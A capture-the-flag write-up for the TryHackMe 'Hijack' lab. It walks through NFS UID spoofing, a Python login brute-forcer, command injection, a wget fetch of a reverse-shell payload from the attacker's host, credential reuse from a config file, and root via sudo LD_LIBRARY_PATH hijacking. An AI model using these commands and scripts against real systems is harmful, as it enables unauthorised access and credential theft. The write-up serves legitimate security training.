# #1 Introduction
<img width="644" alt="image" src="https://github.com/Mate0r/tryhackme.com/assets/94843357/a95db165-a8d1-4830-bd51-c59464c08c96">

# #2 nmap

we first add a domain in /etc/hosts so we don't need to remember the IP
```bash
10.10.xx.xx hijack.thm
```

we run an nmap scan as sudo so it's doing a SYN scan and not a full TCP connection so it's faster

```bash
sudo nmap -T4 -sV -p- hijack.thm
```

we got these open ports
```bash
PORT      STATE SERVICE  VERSION
21/tcp    open  ftp      vsftpd 3.0.3
22/tcp    open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http     Apache httpd 2.4.18 ((Ubuntu))
111/tcp   open  rpcbind  2-4 (RPC #100000)
2049/tcp  open  nfs      2-4 (RPC #100003)
40030/tcp open  mountd   1-3 (RPC #100005)
42026/tcp open  nlockmgr 1-4 (RPC #100021)
43165/tcp open  mountd   1-3 (RPC #100005)
44322/tcp open  mountd   1-3 (RPC #100005)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

# #3 user.txt

## NFS (port 2049)
we display the mountable mountable disk\

```bash
$ showmount -e hijack.thm
Export list for hijack.thm:
/mnt/share *
```

we mount the shared folder to browse the files available
```bash
┌──(parallels㉿kali)-[~/hacking/thm/Hijack]
└─$ sudo mount -t nfs hijack.thm:/mnt/share /mnt/hijack
```

now let's display the content of the shared folder
```bash                                                                                                                                              
┌──(parallels㉿kali)-[~/hacking/thm/Hijack]
└─$ ls -la /mnt/hijack 
ls: cannot open directory '/mnt/hijack': Permission denied
```

hum seems there is something wrong, let's check the right of /mnt/hijack
```bash
┌──(parallels㉿kali)-[~/hacking/thm/Hijack]
└─$ ls -la /mnt
total 16
drwxr-xr-x  4 root     root      4096 Nov  5 02:21 .
drwxr-xr-x 19 root     root      4096 Jul 26 07:14 ..
drwx------  2 1003 1003 4096 Aug  8 21:28 hijack
```

we see that the use who can access the folder, we need to have an user with the 1003 id\
we can create a user with a specific id with the following command\
```
┌──(parallels㉿kali)-[~/hacking/thm/Hijack]
└─$ sudo useradd user1003 -u 1003 -s /bin/bash
```

the -u option is to define the UID and the -s option is to set the default bash\
we can connect with the new account created and now display the files:
```bash
┌──(parallels㉿kali)-[~/hacking/thm/Hijack]
└─$ sudo su user1003                          
user1003@kali:/home/parallels/hacking/thm/Hijack$ ls -la /mnt/hijack/
total 12
drwx------ 2 user1003 user1003 4096 Aug  8 21:28 .
drwxr-xr-x 4 root     root     4096 Nov  5 02:21 ..
-rwx------ 1 user1003 user1003   46 Aug  8 21:28 for_employees.txt
user1003@kali:/home/parallels/hacking/thm/Hijack$ cat /mnt/hijack/for_employees.txt 
ftp creds :

ftpuser:{REDACTED}
```

we have the FTP credentials

## FTP (port 21)

```bash
┌──(parallels㉿kali)-[~/hacking/thm/Hijack]
└─$ ftp hijack.thm
Connected to hijack.thm.
220 (vsFTPd 3.0.3)
Name (hijack.thm:parallels): ftpuser
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||53962|)
150 Here comes the directory listing.
drwxr-xr-x    2 1002     1002         4096 Aug 08 19:28 .
drwxr-xr-x    2 1002     1002         4096 Aug 08 19:28 ..
-rwxr-xr-x    1 1002     1002          220 Aug 08 19:28 .bash_logout
-rwxr-xr-x    1 1002     1002         3771 Aug 08 19:28 .bashrc
-rw-r--r--    1 1002     1002          368 Aug 08 19:28 .from_admin.txt
-rw-r--r--    1 1002     1002         3150 Aug 08 19:28 .passwords_list.txt
-rwxr-xr-x    1 1002     1002          655 Aug 08 19:28 .profile
226 Directory send OK.
```





it take me time to bruteforce the password with the list given : \
i created the follow python script but it's slooow:
```python
import requests
import time
import argparse

parser = argparse.ArgumentParser()
parser.add_argument('--offset', '-o', required=False)
args = parser.parse_args()

file = open("./.passwords_list.txt", 'r')
i = 0

if args.offset is None:
        args.offset = 0

args.offset = int(args.offset)

for password in file:

        i = i + 1
        if i <= args.offset:
                continue

        print(str(i) + ": " + password, end="")
        data = {
                "username":"admin",
                "password":password
        }

        response = requests.post("http://hijack.thm/login.php", data=data)
        html = str(response.content)

        if "second" in html:
                print('blocked')
                time.sleep(300)
        elif "is not valid" not in html:
                print('password found : ' + password)
                exit()

        #time.sleep(15)
```

we found the following password for admin to connect to website\

## HTTP (port 80)

when connected as admin, we have this page that allow us to check a service status running\
let's try with the apache2 service by entering ```apache2```
<img width="1090" alt="image" src="https://github.com/Mate0r/tryhackme.com/assets/94843357/241b3192-4acb-4d06-b193-1a97a91a42a4">

maybe we can try to inject a command with this command ```apache2 && id```
<img width="927" alt="image" src="https://github.com/Mate0r/tryhackme.com/assets/94843357/c56273ae-8e41-460e-a4ab-a9254c9742fb">

ok let's get a rev shell now
```bash
apache2 && wget http://10.8.72.209:8000/shell.php
```

```
┌──(parallels㉿kali)-[~]
└─$ nc -lvnp 6666
listening on [any] 6666 ...
connect to [10.8.72.209] from (UNKNOWN) [10.10.245.215] 37224
Linux Hijack 4.4.0-210-generic #242-Ubuntu SMP Fri Apr 16 09:57:56 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 19:13:36 up 27 min,  0 users,  load average: 0.00, 0.01, 0.16
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$
```

```
logout.php
config.php
administration.php
login.php
signup.php
navbar.php
index.php
```

we can check the config.php file and found db credentials\
maybe we can use it as ssh since there is a rick user existings
```bash
www-data@Hijack:/var/www/html$ cat config.php 
<?php
$servername = "localhost";
$username = "rick";
$password = "N3v3rG0nn4G1v3Y0uUp";
$dbname = "hijack";

// Create connection
$mysqli = new mysqli($servername, $username, $password, $dbname);

// Check connection
if ($mysqli->connect_error) {
  die("Connection failed: " . $mysqli->connect_error);
}
?>
www-data@Hijack:/var/www/html$
```
rick:N3v3rG0nn4G1v3Y0uUp


<img width="863" alt="image" src="https://github.com/Mate0r/tryhackme.com/assets/94843357/640d7076-d471-4643-ae3b-806e0e672a33">

we have a sudo right :
```bash
rick@Hijack:~$ sudo -l
Matching Defaults entries for rick on Hijack:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_LIBRARY_PATH

User rick may run the following commands on Hijack:
    (root) /usr/sbin/apache2 -f /etc/apache2/apache2.conf -d /etc/apache2
rick@Hijack:~$
```


to get the root
https://atom.hackstreetboys.ph/linux-privilege-escalation-environment-variables/


```bash
rick@Hijack:/home/rick$ sudo LD_LIBRARY_PATH=/tmp /usr/sbin/apache2 -f /etc/apache2/apache2.conf -d /etc/apache2                     
/usr/sbin/apache2: /tmp/libcrypt.so.1: no version information available (required by /usr/lib/x86_64-linux-gnu/libaprutil-1.so.0)
root@Hijack:/home/rick# id
uid=0(root) gid=0(root) groups=0(root)
```

